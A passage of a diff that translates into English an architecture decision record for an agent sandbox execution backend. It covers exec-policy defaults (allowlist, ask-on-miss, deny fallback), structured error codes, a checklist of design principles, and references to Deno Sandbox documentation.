+- `ExecPolicy` is added to shared `SandboxConfig`
+- `ToolRegistry` gains `close()` for backend lifecycle, cascaded from
   `AgentLoop.close()`
-- Le `ToolRegistry` passe par `SandboxBackend.execute()` au lieu de
-  `executeInSubprocess()` directement
-- Le callback `ask` utilise le protocole Worker existant (symétrique à
-  `agent_send`)
-- `@deno/sandbox` (jsr:@deno/sandbox) à ajouter dans `deno.json` imports
-- `ToolsConfig.allowedCommands/deniedCommands` dépréciés → migration auto vers
+- `ToolRegistry` now goes through `SandboxBackend.execute()` instead of calling
+  `executeInSubprocess()` directly
+- The `ask` callback uses the existing Worker protocol
+  (symmetric with `agent_send`)
+- `@deno/sandbox` (`jsr:@deno/sandbox`) must be added to `deno.json`
+- `ToolsConfig.allowedCommands` / `deniedCommands` are deprecated and migrate to
   `ExecPolicy`
-- Plus de mode `"auto"` — le backend est toujours choisi explicitement (AX #7)
+- No `"auto"` mode — backend choice is always explicit (AX #7)
 
-## Vérification AX
+## AX verification
 
-| #  | Principe                 | Application dans cet ADR                                                                                                                 |
-| -- | ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------- |
-| 1  | No Verb Overlap          | `security` ≠ `ask` ≠ `askFallback` — champs distincts, sémantiques non ambiguës                                                          |
-| 2  | Safe Defaults            | `security: "allowlist"`, `ask: "on-miss"`, `askFallback: "deny"`, `allowInlineEval: false` (bloqué par défaut), `backend: "local"`                           |
-| 3  | Structured Outputs       | `SandboxExecResult` avec `StructuredError` (`code` + `context` + `recovery`)                                                             |
-| 4  | Machine-Readable Errors  | `SANDBOX_UNAVAILABLE`, `EXEC_DENIED`, `SANDBOX_PERMISSION_DENIED` — codes enum                                                           |
-| 5  | Fast Fail Early          | Exec policy vérifié **avant** le spawn, pas dans le subprocess                                                                           |
-| 6  | Deterministic            | Même config = même backend = même comportement. Pas de `"auto"`                                                                          |
-| 7  | Explicit Over Implicit   | Backend choisi dans la config, pas par env var. Fail-closed sur `"cloud"` sans token. Timeouts séparés. Warning sur ToolsConfig déprécié |
-| 8  | Composable               | `SandboxBackend` est interchangeable. Même `tool_executor.ts` dans les deux backends                                                     |
-| 9  | Narrow Contracts         | `SandboxExecRequest` = minimum requis. `ExecPolicy` = champs optionnels avec défauts safe                                                |
-| 10 | Co-located Documentation | ADR à côté du code. Tests = documentation exécutable                                                                                     |
-| 11 | Test-First Invariants    | Tests `ExecPolicy` et `LocalProcessBackend` en priorité avant le refactoring                                                             |
+| #  | Principle                 | Applied in this ADR                                                                                                                |
+| -- | ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
+| 1  | No Verb Overlap           | `security` ≠ `ask` ≠ `askFallback` — separate fields, distinct semantics                                                           |
+| 2  | Safe Defaults             | `security: "allowlist"`, `ask: "on-miss"`, `askFallback: "deny"`, `allowInlineEval: false`, `backend: "local"`                   |
+| 3  | Structured Outputs        | `SandboxExecResult` with `StructuredError` (`code` + `context` + `recovery`)                                                      |
+| 4  | Machine-Readable Errors   | `SANDBOX_UNAVAILABLE`, `EXEC_DENIED`, `SANDBOX_PERMISSION_DENIED` — enum-like codes                                               |
+| 5  | Fast Fail Early           | Exec policy is validated **before** spawn, not inside the subprocess                                                               |
+| 6  | Deterministic             | Same config = same backend = same behavior. No `"auto"` mode                                                                       |
+| 7  | Explicit Over Implicit    | Backend selected in config, not from env vars. Fail-closed on `"cloud"` without token. Separate timeouts. Warning on deprecated config |
+| 8  | Composable                | `SandboxBackend` is interchangeable. Same `tool_executor.ts` in both backends                                                      |
+| 9  | Narrow Contracts          | `SandboxExecRequest` contains only required fields. `ExecPolicy` keeps optional fields with safe defaults                          |
+| 10 | Co-located Documentation  | ADR lives next to the code. Tests remain executable documentation                                                                   |
+| 11 | Test-First Invariants     | `ExecPolicy` and `LocalProcessBackend` tests should be added first                                                                  |
 
-## Références
+## References
 
-- ADR-005 : Permissions Sandbox par intersection
-- ADR-001 : Agents in Subhosting, code execution in Sandbox
-- OpenClaw exec tool : https://docs.openclaw.ai/tools/exec
-- OpenClaw exec approvals : https://docs.openclaw.ai/tools/exec-approvals
-- OpenClaw node host : https://docs.openclaw.ai/cli/node
-- Deno Sandbox docs : https://docs.deno.com/sandbox/
-- `@deno/sandbox` JSR : https://jsr.io/@deno/sandbox (v0.13.2, pre-release)
+- ADR-005: Sandbox permissions by intersection
+- ADR-001: Agents in Subhosting, code execution in Sandbox
+- OpenClaw exec tool: https://docs.openclaw.ai/tools/exec
+- OpenClaw exec approvals: https://docs.openclaw.ai/tools/exec-approvals
+- OpenClaw node host: https://docs.openclaw.ai/cli/node
+- Deno Sandbox docs: https://docs.deno.com/sandbox/
+- `@deno/sandbox` JSR: https://jsr.io/@deno/sandbox (v0.13.2, pre-release)
